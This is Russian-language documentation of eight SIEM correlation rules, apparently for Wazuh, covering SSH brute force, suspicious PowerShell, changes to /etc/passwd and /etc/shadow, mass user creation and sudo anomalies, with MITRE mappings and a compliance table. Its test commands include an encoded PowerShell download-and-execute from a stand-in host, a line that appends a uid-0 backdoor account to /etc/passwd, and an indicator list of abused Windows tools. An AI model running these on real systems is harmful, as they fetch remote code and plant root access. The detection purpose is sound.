# Документация по правилам корреляции

## Обзор

Реализовано **8 правил корреляции** для детектирования ключевых угроз. Все правила сопоставлены с MITRE ATT&CK.

---

## Правила

### 1. SSH Brute Force (100001)

**Уровень:** 10  
**Частота:** 6 событий за 120 секунд  
**MITRE:** T1110, T1110.001

**Логика:**
- Отслеживает правило 5716 (failed SSH login)
- Группирует по `same_source_ip`
- Срабатывает при 6+ неудачных попытках с одного IP

**Active Response:**
- Автоматический `firewall-drop` на 30 минут (правило 5712)

**Тестирование:**
```bash
for i in {1..10}; do ssh wronguser@target-ip; done
```

---

### 2. Successful Brute Force (100002)

**Уровень:** 12  
**Частота:** 8 событий за 180 секунд  
**MITRE:** T1110, T1078

**Логика:**
- Коррелирует failed logins (5716) с successful login (5715)
- Один и тот же `srcip`
- Указывает на успешный подбор пароля

**Реагирование:**
- Немедленная блокировка IP
- Смена пароля скомпрометированной учётной записи
- Проверка логов на других хостах

---

### 3. Suspicious PowerShell (100003)

**Уровень:** 8  
**MITRE:** T1059.001, T1027, T1105

**Индикаторы:**
- `-enc` / `-encodedcommand`
- `IEX` / `Invoke-Expression`
- `DownloadString` / `Net.WebClient`
- `FromBase64String`
- `bitsadmin`, `certutil`, `regsvr32`, `rundll32`

**Тестирование:**
```powershell
powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA
```

---

### 4. PowerShell Obfuscation (100004)

**Уровень:** 10  
**Частота:** 3 события за 300 секунд  
**MITRE:** T1059.001, T1562.001

**Логика:**
- 3+ срабатывания правила 100003 с одного IP
- Указывает на AMSI Bypass или сложную малварь

---

### 5. /etc/passwd Modified (100005)

**Уровень:** 11  
**MITRE:** T1098, T1136, T1548

**Логика:**
- FIM (File Integrity Monitoring) в реальном времени
- Отслеживает изменения `/etc/passwd`
- Срабатывает на добавление/удаление/изменение пользователей

**Тестирование:**
```bash
echo "backdoor:x:0:0::/root:/bin/bash" | sudo tee -a /etc/passwd
```

---

### 6. Mass User Creation (100006)

**Уровень:** 10  
**Частота:** 4 события за 300 секунд  
**MITRE:** T1136, T1136.001, T1098

**Логика:**
- Отслеживает правило 5902 (useradd/adduser)
- 4+ создания пользователя за 5 минут
- Указывает на подготовку к lateral movement

**Тестирование:**
```bash
for i in {1..5}; do sudo useradd testuser$i; done
```

---

### 7. /etc/shadow Modified (100007)

**Уровень:** 11  
**MITRE:** T1003, T1003.008

**Логика:**
- FIM для `/etc/shadow`
- Обнаруживает изменение хешей паролей
- Возможное повышение привилегий

---

### 8. Sudo Anomaly (100008)

**Уровень:** 8  
**Частота:** 5 событий за 60 секунд  
**MITRE:** T1548, T1548.003

**Логика:**
- 5+ sudo-команд за минуту
- Указывает на privilege escalation или lateral movement

---

## Соответствие стандартам

| Стандарт | Требование | Покрытие |
|---|---|---|
| PCI DSS | 10.2.4, 10.2.5, 10.2.7, 11.4 | ✅ |
| GDPR | IV.30.1.g, IV.32.2, IV.35.7.d | ✅ |
| HIPAA | 164.312.b | ✅ |
| NIST 800-53 | AU.6, AU.14, AC.2, AC.6, AC.7, SI.4 | ✅ |
| TSC | CC6.1, CC6.8, CC7.2, CC7.3 | ✅ |
